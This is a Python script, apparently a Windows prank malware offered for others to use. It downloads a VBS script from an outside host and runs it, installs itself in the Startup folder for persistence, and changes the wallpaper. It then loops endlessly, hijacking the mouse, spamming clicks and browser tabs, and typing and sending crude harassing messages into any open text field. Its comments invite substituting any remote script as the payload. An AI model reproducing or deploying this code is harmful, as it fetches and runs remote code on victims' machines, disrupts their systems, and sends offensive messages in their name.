import pyautogui, random, os, threading, webbrowser, ctypes, requests, getpass

#Downloading image and saving it locally to directory where the script is
bgUrl = "https://charonmaster.000webhostapp.com/owersite_budist.jpg" #You can change url but make sure it goes directly to image
bgDownload = requests.get(bgUrl)
file = open("background.png", "wb")
file.write(bgDownload.content)
file.close()
path = os.getcwd() + "/background.png"
ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0) #Using ctypes module to change background that we have downloaded

vbsUrl = "https://charonmaster.000webhostapp.com/test.vbs" #You can change url and add your vbs script, this one just spams msg box with random symbols
vbsDownload = requests.get(vbsUrl)
file = open("script.vbs", "wb")#If you change the name of script you have to change it in while true loop on bottom of code!
file.write(vbsDownload.content)
file.close()

#This part of script is making .bat file that is going to run script on windows startup if you dont want to run it on startup just remove this part of code
username = getpass.getuser()
path = "C:/Users/"+ str(username) +"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
currentDirectory = os.getcwd() + "/app.py"
os.chdir(path)
with open('owersite.bat', 'w') as f:
    f.write("@echo off\n")
    f.write('python "'+ str(currentDirectory)+'"')
    f.write("\npause")
    f.close()
#Remove from top line 19 to line 27 if you dont want startup feature

#Gets users width and height of screen that is used in movecursor function
width, height = pyautogui.size()

def vbs():
    path = os.getcwd()
    os.chdir(path)
    os.system("cscript script.vbs")

#Opens website by url that you provide in variable
def openwebsite():
    url = "https://github.com/Owersite"
    webbrowser.open(url, new=2)

#Moves mouse on random position on your screen
def movecursor():
    randomX = random.randint(0, width)
    randomY = random.randint(0, height)
    pyautogui.moveTo(randomX, randomY)

#Spam clicks left and right mouse button click
def clicking():
    pyautogui.doubleClick()
    pyautogui.click(button="right")

#Writes messages quickly and spams enter button on keyboard to send message
#So if your cursor gets in some text box where you can write something it will spam messages that you provide
def spammsg():
    pyautogui.write("Im gay ...")
    pyautogui.write("Owersite is my daddy ...")
    pyautogui.press("enter")

while True:
    thread1 = threading.Thread(target=movecursor)
    thread1.start()
    thread2 = threading.Thread(target=openwebsite)
    thread2.start()
    thread3 = threading.Thread(target=vbs)
    thread3.start()
    spammsg()
    clicking()
